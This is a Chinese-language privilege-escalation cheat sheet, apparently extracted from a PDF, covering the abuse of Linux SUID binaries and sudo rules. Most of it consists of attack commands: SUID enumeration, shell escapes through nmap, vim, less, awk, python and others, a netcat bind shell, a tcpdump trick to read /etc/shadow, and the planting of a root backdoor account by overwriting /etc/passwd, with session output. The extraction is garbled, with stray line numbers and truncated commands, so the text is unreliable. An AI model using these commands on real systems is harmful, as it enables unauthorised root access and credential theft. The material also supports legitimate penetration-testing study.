SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文
件。例如，Linux ping命令通常需要root权限才能打开网络套接字。通过将ping程
序标记为SUID（所有者为root），只要低特权用户执行ping程序，便会以root特权
执行ping。
SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位
上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。
当运行具有suid权限的二进制文件时，它将以其他用户身份运行，因此具有其他用户
特权。它可以是root用户，也可以只是另一个用户。如果在程序中设置了suid，该位
可以生成shell或以其他方式滥用，我们可以使用它来提升我们的特权。
以下是一些可用于产生SHELL的程序：
查找suid和guid文件
nmap 
vim 
less 
more
nano
cp
mv
find
1
2
3
4
5
6
7
8
其他命令
命令
结果
find / -perm -4000 -type f 2>/dev/null
查找SUID文件
find / -uid 0 -perm -4000 -type f 2>/dev/null
查找root拥有的
SUID文件
find / -perm -2000 -type f 2>/dev/null
查 找 SGID 文 件
（粘性位）
find / ! -path "*/proc/*" -perm -2 -type f -print 
2>/dev/null
查找世界可写文
件，不包括proc
文件
find / -type f '(' -name *.cert -or -name *.crt -or -name 
*.pem -or -name *.ca -or -name *.p12 -or -name *.cer 
-name *.der ')' '(' '(' -user support -perm -u=r ')' -or '(' 
-group support -perm -g=r ')' -or '(' -perm -o=r ')' ')' 
2> /dev/null-or -name *.cer -name *.der ')' 2> 
/dev/null
查找您可以阅读
的密钥或证书
Find SUID 
find / -perm -u=s -type f 2>/dev/null 
Find GUID 
find / -perm -g=s -type f 2>/dev/null
1
2
3
4
也可以使用 sudo -l 命令列出当前用户可执行的命令
常用提权方式
nmap
命令
结果
find /home –name *.rhosts -print 2>/dev/null
查找rhost配置文
件
find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null 
; -exec cat {} 2>/dev/null ;
查
找
hosts.equiv，列
出权限并管理文
件内容
cat ~/.bash_history
显示当前用户历
史记录
ls -la ~/.*_history
向当前用户分发
各种历史文件
ls -la ~/.ssh/
检查当前用户的
ssh文件
find /etc -maxdepth 1 -name '*.conf' -type f 要么 ls -la 
/etc/*.conf
在/ etc中列出配
置文件（深度1，
在第一个命令中
修 改 maxdepth
参数以对其进行
更改）
lsof | grep '/home/\|/etc/\|/opt/'
显示可能有趣的
打开文件
1  find / -perm -u = s -type f 2> / dev / null –查找设置了SUID位的可执行文件
Nmap的SUID位置1。很多时候，管理员将SUID位设置为nmap，以便可以有效地扫
描网络，因为如果不使用root特权运行它，则所有的nmap扫描技术都将无法使用。
但是，nmap（2.02-5.21）存在交换模式，可利用提权，我们可以在此模式下以交
互方式运行nmap，从而可以转至shell。如果nmap设置了SUID位，它将以root特
权运行，我们可以通过其交互模式访问'root'shell。
msf中的模块为：
 ls -la / usr / local / bin / nmap –让我们确认nmap是否设置了SUID位。
nmap –interactive –运行nmap交互模式
！sh –我们可以从nmap shell转到系统shell
1
1
2
较新版可使用 --script 参数：
find
 nc 反弹 shell：
vi/vim
Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权
限，因此可以读取系统上的所有文件。
打开vim,按下ESC
 或者
 exploit/unix/local/setuid_nmap
 echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/she
 touch test
 find test -exec netcat -lvp 5555 -e /bin/sh \;
:set shell=/bin/sh
:shell
1
1
1
1
1
2
bash
以下命令将以root身份打开一个bash shell。
less
程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令。 
more
cp
sudo vim -c '!sh'
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
less /etc/passwd
!/bin/sh 
more /home/pelle/myfile
!/bin/bash 
1
1
2
3
4
5
1
2
3
1
2
3
覆盖 /etc/shadow 或 /etc/passwd
mv
覆盖 /etc/shadow 或 /etc/passwd
nano
[zabbix@localhost ~]$ cat /etc/passwd >passwd
[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack123
$1$hack$WTn0dk2QjNeKfl.DHOUue0
[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/
[zabbix@localhost ~]$ cp passwd /etc/passwd
[zabbix@localhost ~]$ su - hack
Password:
[root@361way ~]# id
uid=0(hack) gid=0(root) groups=0(root)
[root@361way ~]# cat /etc/passwd|tail -1
hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash 
[zabbix@localhost ~]$ cat /etc/passwd >passwd
[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack123
$1$hack$WTn0dk2QjNeKfl.DHOUue0
[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/
[zabbix@localhost ~]$ mv passwd /etc/passwd
[zabbix@localhost ~]$ su - hack
Password:
[root@361way ~]# id
uid=0(hack) gid=0(root) groups=0(root)
[root@361way ~]# cat /etc/passwd|tail -1
hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash 
 nano  /etc/passwd
1
2
3
4
5
6
7
8
9
10
11
1
2
3
4
5
6
7
8
9
10
11
1
awk
man
wget
apache
仅可查看文件，不能弹 shell：
tcpdump
awk 'BEGIN {system("/bin/sh")}'
 man passwd
!/bin/bash
 wget http://192.168.56.1:8080/passwd -O /etc/passwd
 apache2 -f /etc/shadow
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
1
1
2
1
1
1
2
3
python/perl/ruby/lua/php/etc
python
perl
python -c "import os;os.system('/bin/bash')"
 exec "/bin/bash";
1
1
在渗透中，我们拿到的webshell和反弹回来的shell权限可能都不高，如果我们可以使用sudo命令访问某些程序，则我们可以使用sudo可以
升级特权。在这里，我显示了一些二进制文件，这些文件可以帮助您使用sudo命令提升特权。但是在特权升级之前，让我们了解一些
sudoer文件语法，sudo命令是什么？;）。
1. 什么是SUDO？
2. Sudoer文件语法。
4. 利用SUDO用户
/usr/bin/find
/usr/bin/nano
/usr/bin/vim
/usr/bin/man
/usr/bin/awk
/usr/bin/less
/usr/bin/nmap ( –interactive and –script method)
/bin/more
/usr/bin/wget
/usr/sbin/apache2
什么是SUDO ??
sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 
和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。
基础
它的特性主要有这样几点：
§ sudo能够限制用户只在某台主机上运行某些命令。
§ sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。
§ sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改
变）。
§ sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在/etc/sudoers，属性必须为0440。
在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。
sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信
息，登记在特殊的文件中（通常是/etc/sudoers），即完成对该用户的授权（此时该用户称为“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上
“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内
（默认为5分钟，可在/etc/sudoers自定义），使用sudo不需要再次输入密码。
由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、Mac OS X等。
参数说明：
-V 显示版本编号
-h 会显示版本编号及指令的使用方式说明
-l 显示出自己（执行 sudo 的使用者）的权限
-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码
-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）
-b 将要执行的指令放在背景执行
-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称
-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）
-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell
-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）
command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令
Sudoer文件
sudoers文件主要有三部分组成：
sudoers的默认配置（default），主要设置sudo的一些缺省值
alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。
安全策略（规则定义）——重点。
语法
root ALL=(ALL) ALL
说明1：root用户可以从  ALL  终端作为  ALL  （任意）用户执行，并运行  ALL  （任意）命令。
第一部分是用户，第二部分是用户可以在其中使用 sudo 命令的终端，第三部分是他可以充当的用户，最后一部分是他在使用时可以运行的
命令。 sudo
touhid ALL= /sbin/poweroff 
说明2：以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。
touhid ALL = (root) NOPASSWD: /usr/bin/find
说明3：上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。
利用SUDO用户。
要利用sudo用户，您需要找到您必须允许的命令。
sudo -l